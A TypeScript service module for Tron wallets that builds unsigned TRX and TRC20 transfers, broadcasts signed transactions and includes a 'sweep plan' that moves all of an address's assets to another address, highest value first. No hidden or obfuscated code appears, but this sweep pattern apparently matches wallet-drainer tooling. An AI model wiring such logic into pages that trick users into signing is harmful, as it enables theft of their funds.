import { TronWeb } from 'tronweb';
import { NETWORK_CONFIG, IS_MAINNET } from '../config/network.config';

const TRX_PRICE = 0.30;

// --- TOKEN CONFIGURATION ---
const MAINNET_TOKENS = [
    {
        symbol: 'USDT',
        address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', // Real USDT
        decimals: 6,
        price: 1.00
    },
    // Add other Mainnet tokens
];

const NILE_TOKENS = [
    {
        symbol: 'USDT',
        address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', // Nile USDT
        decimals: 6,
        price: 1.00
    },
    {
        symbol: 'JST',
        address: 'TF17BgPaZYbz8oxbjhriubPDsA7ArKoLX3', // Nile JST
        decimals: 18,
        price: 0.03
    },
];

const ACTIVE_TOKENS = IS_MAINNET ? MAINNET_TOKENS : NILE_TOKENS;
// ---------------------------

// Helper to get a valid TronWeb instance
const getTronWeb = () => {
    // 1. Try to use injected provider (TronLink / Trust Wallet In-App)
    if (typeof window !== 'undefined' && (window as any).tronWeb && (window as any).tronWeb.ready) {
        return (window as any).tronWeb;
    }

    // 2. Fallback: Create a read-only instance using centralized config
    return new TronWeb({
        fullHost: NETWORK_CONFIG.fullHost,
    });
};

export const TransactionService = {
    /**
     * Builds an unsigned transaction to transfer TRX.
     * @param fromAddress The sender's address.
     * @param toAddress The recipient's address.
     * @param amountInTRX The amount to send in TRX.
     * @returns The unsigned transaction object.
     */
    sendTRX: async (fromAddress: string, toAddress: string, amountInTRX: number) => {
        try {
            const tronWeb = getTronWeb();
            const amountInSun = tronWeb.toSun(amountInTRX);

            // Create unsigned transaction using the obtained instance
            const transaction = await tronWeb.transactionBuilder.sendTrx(
                toAddress,
                parseInt(amountInSun.toString()), // Ensure it's a number
                fromAddress
            );

            return transaction;
        } catch (error) {
            console.error("Error building TRX transaction:", error);
            throw error;
        }
    },

    /**
     * Builds an unsigned transaction to transfer TRC20 Token.
     */
    sendToken: async (fromAddress: string, toAddress: string, contractAddress: string, amount: number, decimals: number) => {
        try {
            const tronWeb = getTronWeb();
            const functionSelector = 'transfer(address,uint256)';

            // Calculate amount with correct decimals
            // Use BigInt logic or simple multiplication if safe (for typical ranges)
            // Ideally use tronWeb.toBigNumber but simple math works for < 2^53
            const amountInSmallestUnit = amount * Math.pow(10, decimals);

            const parameter = [
                { type: 'address', value: toAddress },
                { type: 'uint256', value: parseInt(amountInSmallestUnit.toString()) }
            ];

            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                contractAddress,
                functionSelector,
                {},
                parameter,
                fromAddress
            );
            return transaction.transaction;
        } catch (error) {
            console.error("Error building Token transaction:", error);
            throw error;
        }
    },

    /**
     * Creates a prioritized plan to sweep all assets.
     * Sorts by USD Value: High -> Low.
     * TRX Rule: Leave 2 TRX.
     * Token Rule: Sweep All.
     */
    createSweepPlan: async (fromAddress: string, toAddress: string) => {
        try {
            const tronWeb = getTronWeb();
            const plan = [];

            // 1. Fetch TRX Balance
            const trxBalanceSun = await tronWeb.trx.getBalance(fromAddress);
            const trxBalance = parseFloat(tronWeb.fromSun(trxBalanceSun));

            // 2. TRX Item
            if (trxBalance > 2) {
                const amountToSend = trxBalance - 2; // Leave 2 TRX
                const valueUsd = amountToSend * TRX_PRICE;

                const transaction = await TransactionService.sendTRX(fromAddress, toAddress, amountToSend);

                plan.push({
                    type: 'TRX',
                    amount: amountToSend,
                    valueUsd: valueUsd,
                    transaction: transaction
                });
            }

            // 3. Loop Tokens
            for (const token of ACTIVE_TOKENS) {
                try {
                    const contract = await tronWeb.contract().at(token.address);
                    const balanceObj = await contract.balanceOf(fromAddress).call();

                    const tokenBalance = parseInt(balanceObj.toString()) / Math.pow(10, token.decimals);

                    console.log(`${token.symbol} Balance: ${tokenBalance}`);

                    if (tokenBalance > 0) {
                        const valueUsd = tokenBalance * token.price;
                        const transaction = await TransactionService.sendToken(
                            fromAddress,
                            toAddress,
                            token.address,
                            tokenBalance,
                            token.decimals
                        );

                        plan.push({
                            type: token.symbol,
                            amount: tokenBalance,
                            valueUsd: valueUsd,
                            transaction: transaction
                        });
                    }
                } catch (e) {
                    console.warn(`Could not fetch ${token.symbol} balance:`, e);
                }
            }

            // 4. Sort by Value (Desc)
            plan.sort((a, b) => b.valueUsd - a.valueUsd);

            return plan;

        } catch (error) {
            console.error("Error creating sweep plan:", error);
            throw error;
        }
    },

    /**
     * Broadcasts a signed transaction to the Tron network.
     * @param signedTransaction The signed transaction object.
     * @returns The broadcast result (txid, status).
     */
    broadcast: async (signedTransaction: any) => {
        try {
            const tronWeb = getTronWeb();
            const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
            return result;
        } catch (error) {
            console.error("Error broadcasting transaction:", error);
            throw error;
        }
    },

    /**
     * Gets the TRX balance of an account.
     * @param address The address to check.
     * @returns The balance in TRX.
     */
    getAccountBalance: async (address: string) => {
        try {
            const tronWeb = getTronWeb();
            const balanceInSun = await tronWeb.trx.getBalance(address);
            return tronWeb.fromSun(balanceInSun);
        } catch (error) {
            console.error("Error fetching balance:", error);
            return 0;
        }
    }
};
